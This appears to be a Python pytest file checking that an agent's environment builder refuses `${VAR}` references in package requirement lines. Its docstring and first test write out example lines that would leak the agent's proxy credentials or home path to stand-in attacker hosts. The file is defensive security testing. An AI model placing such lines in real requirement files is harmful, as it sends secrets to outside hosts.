# ruff: noqa: SIM105, N815
"""V0.7 G6 tester r2 (T-15, minor): `${VAR}` in a job's requirement line is
expanded by the installer with the AGENT's environment, and the value goes to
whatever host the line names.

uv expands `${NAME}` in requirements files. The tool environment is an
allowlist (PATH, HOME, TMPDIR, `http_proxy`/`https_proxy` - which may carry
`user:password@` -, SSL_CERT_*...), but the gate accepts
`pkg @ https://${HTTPS_PROXY}.attacker.example/pkg-1-py3-none-any.whl`
(a `.whl` URL) and the request reaches the attacker. Expected: the normaliser
refuses `${` (the line cannot mean one thing on every node anyway: the env hash
would not cover the expanded text).
"""

from __future__ import annotations

import http.server
import threading
from collections.abc import Iterator
from pathlib import Path

import pytest

from meshforge.agent.envs.builder import EnvBuilder, EnvsConfig, default_uv_argv
from meshforge.agent.envs.errors import EnvError
from meshforge.agent.envs.hash import normalize_requirements

pytestmark = [pytest.mark.component]


def test_the_normaliser_refuses_environment_references() -> None:
    for line in (
        b"pkg @ https://${HTTPS_PROXY}.evil.example/pkg-1-py3-none-any.whl\n",
        b"pkg @ https://evil.example/${HOME}/pkg-1-py3-none-any.whl\n",
        b"pkg==${V}\n",
    ):
        with pytest.raises(EnvError):
            normalize_requirements(line, wheels_only=True)


if default_uv_argv():

    @pytest.fixture
    def requests_seen() -> Iterator[tuple[str, list[str]]]:
        seen: list[str] = []

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                seen.append(self.path)
                self.send_response(404)
                self.end_headers()

            do_HEAD = do_GET

            def log_message(self, *args: object) -> None:
                pass

        httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        yield f"http://127.0.0.1:{httpd.server_port}", seen
        httpd.shutdown()
        httpd.server_close()

    @pytest.mark.asyncio
    async def test_the_agents_environment_never_reaches_a_url_host(
        tmp_path: Path, requests_seen: tuple[str, list[str]]
    ) -> None:
        base, seen = requests_seen
        builder = EnvBuilder(
            EnvsConfig(
                root=tmp_path / "envs", free_disk_floor_bytes=0, only_binary=True
            )
        )
        import os

        home = os.environ["HOME"].strip("/")
        line = f"pkg @ {base}/${{HOME}}/pkg-1-py3-none-any.whl\n"
        try:
            await builder.ensure_target(requirements=line.encode(), deadline=1e18)
        except EnvError:
            pass
        assert not any(home in path for path in seen), seen
